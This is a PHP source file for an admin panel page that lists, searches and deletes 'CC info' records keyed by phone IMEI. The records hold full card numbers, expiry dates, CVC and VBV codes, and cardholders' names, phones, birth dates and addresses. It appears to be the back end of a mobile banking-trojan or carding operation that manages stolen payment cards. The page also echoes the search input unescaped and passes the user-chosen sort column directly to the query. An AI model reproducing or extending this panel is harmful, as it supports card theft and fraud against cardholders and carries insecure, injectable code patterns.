<?php
session_start();
require_once 'includes/auth_validate.php';
require_once './config/config.php';

// Serve deletion if POST method and del_id is set.

//Get data from query string
$search_string = filter_input(INPUT_GET, 'search_string');


$filter_col = filter_input(INPUT_GET, 'filter_col');
$order_by = filter_input(INPUT_GET, 'order_by');
$page = filter_input(INPUT_GET, 'page');
$pagelimit = 20;
if ($page == "") {
    $page = 1;
}
// If filter types are not selected we show latest added data first
if ($filter_col == "") {
    $filter_col = "id";
}
if ($order_by == "") {
    $order_by = "desc";
}

// select the columns
$select = array('id','IMEI','CARD','typeCard','MMYY','CVC','VBV','CardholderName','PhoneNumber','birth_date','zip_code','holder_address','last_update');

// If user searches
if ($search_string)
{
    $db->where('IMEI', '%' . $search_string . '%', 'like');
    $db->orwhere('CARD', '%' . $search_string . '%', 'like');
}


if ($order_by)
{
    $db->orderBy($filter_col, $order_by);
}

$db->pageLimit = $pagelimit;
$cc_info = $db->arraybuilder()->paginate("cc_info", $page, $select);
$total_pages = $db->totalPages;

// get columns for order filter
foreach ($cc_info as $value) {
    foreach ($value as $col_name => $col_value) {
        $filter_options[$col_name] = $col_name;
    }
    //execute only once
    break;
}
include_once 'includes/header.php';
?>
<div id="page-wrapper">
    <div class="row">

        <div class="col-lg-6">
            <h1 class="page-header">CC info</h1>
        </div>
        <div class="col-lg-6" style="">
            <div class="page-action-links text-right">
                <button class="btn btn-danger delete_btn" onclick="deleteIds('delete_cc.php')" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></span> Delete selected CC </button>
            </div>
        </div>
    </div>
    <?php include('./includes/flash_messages.php') ?>
    <!--    Begin filter section-->
    <div class="well text-center filter-form">
        <form class="form form-inline" action="">
            <label for="input_search">Search IMEI or text in CC</label>
            <input type="text" id="input_search" name="search_string" value="<?php echo $search_string; ?>">
            <label for ="input_order">Order By</label>
            <select name="filter_col">

                <?php
                foreach ($filter_options as $option) {
                    ($filter_col === $option) ? $selected = "selected" : $selected = "";
                    echo ' <option value="' . $option . '" ' . $selected . '>' . $option . '</option>';
                }
                ?>

            </select>

            <select name="order_by" class="" id="input_order">

                <option value="Asc" <?php
                if ($order_by == 'Asc') {
                    echo "selected";
                }
                ?> >Asc</option>
                <option value="Desc" <?php
                if ($order_by == 'Desc') {
                    echo "selected";
                }
                ?>>Desc</option>
            </select>
            <input type="submit" value="Go" class="btn btn-primary">

        </form>
    </div>
    <!--   Filter section end-->

    <hr>


    <table class="table table-striped table-bordered table-condensed">
        <thead>
        <tr>
            <th class="header"><input type="checkbox" class="form-check-input" id="chk" onclick="chkAll()"></th>
            <th class="header">#</th>
            <th>IMEI</th>
            <th>CARD</th>
            <th>type</th>
            <th>MMYY</th>
            <th>CVC</th>
            <th>VBV</th>
            <th>CardholderName</th>
            <th>PhoneNumber</th>
            <th>BirthDay</th>
            <th>ZIP</th>
            <th>Address</th>
            <th>Time</th>
            <th>Action</th>
        </tr>
        </thead>
        <tbody>
        <?php
        foreach ($cc_info as $row) { ?>
            <tr>
                <td><input type="checkbox" class="form-check-input" id="chk_imei" value="<?php echo $row['id'] ?>"></td>
                <td><?php echo $row['id'] ?></td>
                <td><a href="edit_client.php?client_imei=<?php echo $row['IMEI'] ?>&operation=edit"><?php echo $row['IMEI'] ?></a></td>
                <td><?php echo $row['CARD'] ?></td>
                <td><?php echo $row['typeCard'] ?></td>
                <td><?php echo $row['MMYY'] ?></td>
                <td><?php echo $row['CVC'] ?></td>
                <td><?php echo $row['VBV'] ?></td>
                <td><?php echo $row['CardholderName'] ?></td>
                <td><?php echo $row['PhoneNumber'] ?></td>
                <td><?php echo $row['birth_date'] ?></td>
                <td><?php echo $row['zip_code'] ?></td>
                <td><?php echo $row['holder_address'] ?></td>
                <td><?php echo date("Y-m-d H:i",$row['last_update']) ?></td>
                <td>
                    <a href="" class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
            </tr>

            <!-- Delete Confirmation Modal-->
            <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                <div class="modal-dialog">
                    <form action="delete_cc.php" method="POST">
                        <!-- Modal content-->
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                <h4 class="modal-title">Confirm</h4>
                            </div>
                            <div class="modal-body">

                                <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">

                                <p>Are you sure you want to delete this CC?</p>
                            </div>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-default pull-left">Yes</button>
                                <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                            </div>
                        </div>
                    </form>

                </div>
            </div>

        <?php } ?>
        </tbody>
    </table>



    <!--    Pagination links-->
    <div class="text-center">

        <?php
        if (!empty($_GET)) {
            //we must unset $_GET[page] if built by http_build_query function
            unset($_GET['page']);
            $http_query = "?" . http_build_query($_GET);
        } else {
            $http_query = "?";
        }
        if ($total_pages > 1) {
            echo '<ul class="pagination text-center">';
            for ($i = 1; $i <= $total_pages; $i++) {
                ($page == $i) ? $li_class = ' class="active"' : $li_class = "";
                echo '<li' . $li_class . '><a href="list_cc.php' . $http_query . '&page=' . $i . '">' . $i . '</a></li>';
            }
            echo '</ul></div>';
        }
        ?>
    </div>

</div>
<!--Main container end-->


<?php include_once './includes/footer.php'; ?>

